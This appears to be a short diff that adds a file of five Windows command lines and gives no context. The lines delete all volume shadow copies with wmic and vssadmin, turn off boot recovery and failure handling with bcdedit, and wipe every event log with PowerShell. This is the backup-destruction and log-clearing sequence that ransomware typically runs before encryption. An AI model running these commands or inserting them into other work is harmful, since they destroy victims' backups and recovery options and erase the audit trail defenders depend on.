@@ -1,0 +1,5 @@
+cmd /c wmic shadowcopy delete /nointeractive
+cmd /c vssadmin.exe Delete Shadows /All /Quiet
+cmd /c bcdedit /set {default} recoveryenabled No
+cmd /c bcdedit /set {default} bootstatuspolicy ignoreallfailures
+cmd /c powershell -command \"Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }\"
